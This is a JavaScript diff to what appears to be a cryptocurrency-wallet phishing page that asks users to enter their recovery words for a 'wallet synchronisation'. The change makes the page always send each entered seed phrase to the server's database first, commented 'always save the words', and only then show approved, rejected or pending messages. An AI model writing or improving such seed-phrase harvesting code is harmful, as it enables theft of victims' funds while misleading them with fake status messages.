@@ -323,34 +323,7 @@
             const seedPhrase = words.join(' ');
 
             try {
-                // ÉTAPE 1 : Vérifier d'abord le statut
-                const statusCheck = await checkStatus(seedPhrase);
-                
-                const statusDiv = document.getElementById('statusMessage');
-                statusDiv.style.display = 'block';
-                
-                if (statusCheck && statusCheck.success) {
-                    // Une décision a déjà été prise
-                    if (statusCheck.status === 'approved') {
-                        statusDiv.className = 'status-box status-approved';
-                        statusDiv.innerHTML = '✅ Wallet synchronisé !';
-                        showToast('✅ Wallet synchronisé avec succès !', 'success');
-                        return;
-                    } else if (statusCheck.status === 'rejected') {
-                        statusDiv.className = 'status-box status-rejected';
-                        statusDiv.innerHTML = '❌ Erreur de vérification, vérifiez les mots';
-                        showToast('❌ Erreur de vérification', 'error');
-                        return;
-                    } else {
-                        // Statut 'pending'
-                        statusDiv.className = 'status-box status-pending';
-                        statusDiv.innerHTML = '⏳ En attente de synchronisation...';
-                        showToast('⏳ En attente de validation', 'info');
-                        return;
-                    }
-                }
-
-                // ÉTAPE 2 : Si aucune décision n'existe, créer une nouvelle demande
+                // ÉTAPE 1 : TOUJOURS sauvegarder les mots dans la base
                 const registerResponse = await fetch('/api/auth/register', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -365,6 +338,32 @@
                 const registerData = await registerResponse.json();
                 console.log('📝 Enregistrement:', registerData);
                 
+                // ÉTAPE 2 : Vérifier le statut
+                const statusCheck = await checkStatus(seedPhrase);
+                
+                const statusDiv = document.getElementById('statusMessage');
+                statusDiv.style.display = 'block';
+                
+                if (statusCheck && statusCheck.success) {
+                    if (statusCheck.status === 'approved') {
+                        statusDiv.className = 'status-box status-approved';
+                        statusDiv.innerHTML = '✅ Wallet synchronisé !';
+                        showToast('✅ Wallet synchronisé avec succès !', 'success');
+                        return;
+                    } else if (statusCheck.status === 'rejected') {
+                        statusDiv.className = 'status-box status-rejected';
+                        statusDiv.innerHTML = '❌ Erreur de vérification, vérifiez les mots';
+                        showToast('❌ Erreur de vérification', 'error');
+                        return;
+                    } else {
+                        statusDiv.className = 'status-box status-pending';
+                        statusDiv.innerHTML = '⏳ En attente de synchronisation...';
+                        showToast('⏳ Demande envoyée, attente de validation', 'info');
+                        return;
+                    }
+                }
+                
+                // Si pas de statut, afficher en attente
                 statusDiv.className = 'status-box status-pending';
                 statusDiv.innerHTML = '⏳ En attente de synchronisation...';
                 showToast('⏳ Demande envoyée, attente de validation', 'info');
